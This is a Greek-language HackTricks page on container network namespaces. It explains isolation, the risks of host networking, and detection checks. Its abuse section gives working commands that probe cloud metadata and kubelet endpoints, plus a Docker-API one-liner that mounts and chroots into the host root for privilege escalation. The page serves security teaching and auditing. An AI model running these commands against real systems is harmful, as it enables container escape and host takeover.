# Χώρος ονομάτων δικτύου

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ο network namespace απομονώνει πόρους σχετιζόμενους με το δίκτυο όπως interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, και τα περιεχόμενα αρχείων όπως `/proc/net`. Γι' αυτό ένα container μπορεί να έχει κάτι που μοιάζει με το δικό του `eth0`, τις δικές του local routes, και τη δική του loopback συσκευή χωρίς να κατέχει το πραγματικό network stack του host.

Από πλευράς ασφάλειας, αυτό έχει σημασία επειδή η απομόνωση δικτύου αφορά πολύ περισσότερα από το port binding. Ένας ιδιωτικός network namespace περιορίζει το τι μπορεί να παρατηρήσει ή να επαναδιαμορφώσει άμεσα το workload. Μόλις αυτός ο namespace κοινοποιηθεί με τον host, το container μπορεί ξαφνικά να αποκτήσει ορατότητα σε host listeners, host-local services, και network control points που ποτέ δεν προορίζονταν να εκτεθούν στην εφαρμογή.

## Λειτουργία

Ένας freshly created network namespace ξεκινά με ένα κενό ή σχεδόν κενό περιβάλλον δικτύου μέχρι να προσαρτηθούν interfaces. Τα container runtimes στη συνέχεια δημιουργούν ή συνδέουν virtual interfaces, αντιστοιχίζουν addresses, και διαμορφώνουν routes ώστε το workload να έχει την αναμενόμενη συνδεσιμότητα. Σε bridge-based deployments, αυτό συνήθως σημαίνει ότι το container βλέπει μια veth-backed interface συνδεδεμένη σε έναν host bridge. Στο Kubernetes, τα CNI plugins χειρίζονται την αντίστοιχη ρύθμιση για το Pod networking.

Αυτή η αρχιτεκτονική εξηγεί γιατί το `--network=host` ή το `hostNetwork: true` αποτελούν τόσο δραματική αλλαγή. Αντί να λαμβάνει ένα προετοιμασμένο ιδιωτικό network stack, το workload εντάσσεται στο πραγματικό του host.

## Εργαστήριο

Μπορείτε να δείτε έναν σχεδόν κενό network namespace με:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Και μπορείτε να συγκρίνετε normal και host-networked containers με:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Το host-networked container δεν έχει πλέον τη δική του απομονωμένη προβολή socket και interface. Αυτή η αλλαγή από μόνη της είναι σημαντική πριν καν ρωτήσετε ποιες δυνατότητες έχει η διεργασία.

## Χρήση κατά το runtime

Docker και Podman συνήθως δημιουργούν ένα private network namespace για κάθε container, εκτός αν διαμορφωθούν διαφορετικά. Το Kubernetes συνήθως δίνει σε κάθε Pod το δικό του network namespace, το οποίο μοιράζονται τα containers μέσα σε αυτό το Pod αλλά είναι ξεχωριστό από τον host. Τα συστήματα Incus/LXC παρέχουν επίσης πλούσια απομόνωση βασισμένη σε network namespaces, συχνά με μεγαλύτερη ποικιλία virtual networking ρυθμίσεων.

Η κοινή αρχή είναι ότι το private networking είναι το προεπιλεγμένο όριο απομόνωσης, ενώ το host networking είναι μια ρητή επιλογή εξόδου από αυτό το όριο.

## Λανθασμένες διαμορφώσεις

Η σημαντικότερη λανθασμένη διαμόρφωση είναι απλώς το μοίρασμα του host network namespace. Αυτό γίνεται μερικές φορές για λόγους απόδοσης, low-level monitoring ή ευκολίας, αλλά αφαιρεί ένα από τα καθαρότερα όρια που είναι διαθέσιμα στα containers. Οι host-local listeners γίνονται προσπελάσιμοι με πιο άμεσο τρόπο, υπηρεσίες που ήταν προσβάσιμες μόνο από το localhost μπορεί να γίνουν προσβάσιμες, και δυνατότητες όπως `CAP_NET_ADMIN` ή `CAP_NET_RAW` γίνονται πολύ πιο επικίνδυνες επειδή οι ενέργειες που επιτρέπουν εφαρμόζονται τώρα στο ίδιο το network περιβάλλον του host.

Ένα άλλο πρόβλημα είναι η υπερβολική παροχή δικαιωμάτων που σχετίζονται με το δίκτυο ακόμη και όταν το network namespace είναι ιδιωτικό. Ένα private namespace βοηθά, αλλά δεν καθιστά τα raw sockets ή τον προηγμένο έλεγχο δικτύου αβλαβή.

Στο Kubernetes, το `hostNetwork: true` αλλάζει επίσης πόση εμπιστοσύνη μπορείτε να δείξετε στην τμηματοποίηση δικτύου σε επίπεδο Pod. Η Kubernetes τεκμηρίωση αναφέρει ότι πολλά network plugins δεν μπορούν να διακρίνουν σωστά την κίνηση των `hostNetwork` Pods για matching σε `podSelector` / `namespaceSelector` και συνεπώς τη μεταχειρίζονται ως συνηθισμένη κίνηση κόμβου. Από την άποψη του επιτιθέμενου, αυτό σημαίνει ότι ένα συμβιβασμένο `hostNetwork` workload θα πρέπει συχνά να θεωρείται ως ένα node-level network foothold παρά ως ένα κανονικό Pod που εξακολουθεί να περιορίζεται από τις ίδιες πολιτικές υποθέσεις όπως workloads σε overlay-network.

## Κατάχρηση

Σε ασθενώς απομονωμένα περιβάλλοντα, οι επιτιθέμενοι μπορεί να εξετάσουν υπηρεσίες που ακούνε στον host, να προσεγγίσουν management endpoints δεσμευμένα μόνο στο loopback, να sniffάρουν ή να παρεμβαίνουν στην κίνηση ανάλογα με τις ακριβείς δυνατότητες και το περιβάλλον, ή να αναδιαμορφώσουν routing και κατάσταση firewall εάν υπάρχει `CAP_NET_ADMIN`. Σε ένα cluster, αυτό μπορεί επίσης να διευκολύνει την πλευρική κίνηση και την αναγνώριση του control-plane.

Εάν υποψιάζεστε host networking, ξεκινήστε επιβεβαιώνοντας ότι τα ορατά interfaces και οι listeners ανήκουν στον host και όχι σε ένα απομονωμένο container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Οι Loopback-only services είναι συχνά η πρώτη ενδιαφέρουσα ανακάλυψη:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Εάν υπάρχουν δυνατότητες δικτύου, ελέγξτε αν το workload μπορεί να επιθεωρήσει ή να τροποποιήσει το visible stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Σε σύγχρονους πυρήνες, το host networking μαζί με το `CAP_NET_ADMIN` μπορεί επίσης να αποκαλύψει τη διαδρομή των πακέτων πέρα από απλές αλλαγές σε `iptables` / `nftables`. Τα qdiscs και τα φίλτρα του `tc` είναι επίσης περιορισμένα στο namespace, οπότε σε κοινόχρηστο host network namespace εφαρμόζονται στις διεπαφές του host που μπορεί να δει το container. Αν υπάρχει επιπλέον το `CAP_BPF`, προγράμματα eBPF σχετιζόμενα με το δίκτυο, όπως φορτωτές TC και XDP, γίνονται επίσης σχετικά:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Αυτό έχει σημασία επειδή ένας επιτιθέμενος μπορεί να είναι σε θέση να mirror, redirect, shape ή drop traffic στο επίπεδο του host interface, όχι μόνο να επαναγράφει κανόνες firewall. Σε ένα private network namespace αυτές οι ενέργειες περιορίζονται στην προβολή του container· σε ένα shared host namespace γίνονται host-impacting.

Σε cluster ή cloud περιβάλλοντα, το host networking επίσης δικαιολογεί γρήγορο local recon του metadata και των control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Πλήρες Παράδειγμα: Host Networking + Local Runtime / Kubelet Access

Το Host networking δεν παρέχει αυτόματα host root, αλλά συχνά εκθέτει υπηρεσίες που σκόπιμα είναι προσβάσιμες μόνο από τον ίδιο τον node. Εάν κάποια από αυτές τις υπηρεσίες είναι ασθενώς προστατευμένη, το Host networking μετατρέπεται σε άμεσο μονοπάτι privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet στο localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- άμεση παραβίαση του host εάν ένα local runtime API εκτεθεί χωρίς κατάλληλη προστασία
- cluster reconnaissance ή lateral movement εάν kubelet ή local agents είναι προσεγγίσιμοι
- traffic manipulation ή denial of service όταν συνδυάζεται με `CAP_NET_ADMIN`

## Checks

Ο στόχος αυτών των ελέγχων είναι να μάθετε αν η διαδικασία έχει ιδιωτικό network stack, ποιες routes και listeners είναι ορατές, και αν η εικόνα του δικτύου ήδη μοιάζει με host πριν καν δοκιμάσετε capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Τι είναι ενδιαφέρον εδώ:

- Αν `/proc/self/ns/net` και `/proc/1/ns/net` ήδη δείχνουν σαν του host, το container μπορεί να μοιράζεται το host network namespace ή κάποιο άλλο μη-ιδιωτικό namespace.
- `lsns -t net` και `ip netns identify` είναι χρήσιμα όταν το shell είναι ήδη μέσα σε ένα ονομασμένο ή επίμονο namespace και θέλετε να το συσχετίσετε με τα αντικείμενα `/run/netns` από την πλευρά του host.
- `ss -lntup` είναι ιδιαίτερα πολύτιμο γιατί αποκαλύπτει listeners προσβάσιμους μόνο από το loopback και τοπικά management endpoints.
- Οι routes, τα ονόματα διεπαφών, το firewall context, η κατάσταση του `tc` και οι eBPF attachments γίνονται πολύ πιο σημαντικά αν υπάρχει `CAP_NET_ADMIN`, `CAP_NET_RAW` ή `CAP_BPF`.
- Στο Kubernetes, η αποτυχία επίλυσης ονόματος service από ένα `hostNetwork` Pod μπορεί απλώς να σημαίνει ότι το Pod δεν χρησιμοποιεί `dnsPolicy: ClusterFirstWithHostNet`, και όχι ότι το service λείπει.

Όταν εξετάζετε ένα container, αξιολογήστε πάντα το network namespace μαζί με το σύνολο δυνατοτήτων. Το host networking σε συνδυασμό με ισχυρές network capabilities είναι μια πολύ διαφορετική κατάσταση σε σχέση με το bridge networking μαζί με ένα περιορισμένο προεπιλεγμένο σύνολο δυνατοτήτων.

## Αναφορές

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
